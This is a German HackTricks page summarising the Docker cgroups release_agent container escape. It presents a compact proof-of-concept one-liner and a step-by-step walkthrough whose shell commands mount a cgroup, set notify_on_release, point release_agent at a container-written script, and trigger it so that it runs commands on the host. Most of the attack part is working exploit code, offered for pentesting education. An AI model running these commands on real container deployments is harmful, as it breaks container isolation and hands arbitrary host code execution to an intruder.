# Docker release\_agent cgroups escape

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>


**Weitere Details finden Sie im [Original-Blogbeitrag](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/).** Dies ist nur eine Zusammenfassung:

Ursprünglicher PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Der Proof of Concept (PoC) zeigt eine Methode, um cgroups auszunutzen, indem eine `release_agent`-Datei erstellt wird und deren Aufruf ausgelöst wird, um beliebige Befehle auf dem Container-Host auszuführen. Hier ist eine Aufschlüsselung der beteiligten Schritte:

1. **Umgebung vorbereiten:**
- Ein Verzeichnis `/tmp/cgrp` wird erstellt, um als Mount-Punkt für die cgroup zu dienen.
- Der RDMA cgroup-Controller wird auf dieses Verzeichnis gemountet. Falls der RDMA-Controller nicht vorhanden ist, wird empfohlen, den `memory` cgroup-Controller als Alternative zu verwenden.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Einrichten des untergeordneten Cgroups:**
- Ein untergeordneter Cgroup mit dem Namen "x" wird im eingehängten Cgroup-Verzeichnis erstellt.
- Benachrichtigungen für den Cgroup "x" werden aktiviert, indem eine 1 in seine notify_on_release Datei geschrieben wird.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Konfigurieren Sie den Release-Agenten:**
- Der Pfad des Containers auf dem Host wird aus der Datei /etc/mtab abgerufen.
- Die release_agent-Datei der cgroup wird dann so konfiguriert, dass ein Skript namens /cmd ausgeführt wird, das sich im erworbenen Host-Pfad befindet.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Erstellen und Konfigurieren des /cmd-Skripts:**
- Das /cmd-Skript wird innerhalb des Containers erstellt und so konfiguriert, dass es ps aux ausführt und die Ausgabe in einer Datei namens /output im Container umleitet. Der vollständige Pfad von /output auf dem Host wird angegeben.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Angriff auslösen:**
- Ein Prozess wird innerhalb des "x" Kind-Cgroups gestartet und sofort beendet.
- Dadurch wird der `release_agent` (das /cmd-Skript) ausgelöst, das ps aux auf dem Host ausführt und die Ausgabe in /output innerhalb des Containers schreibt.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
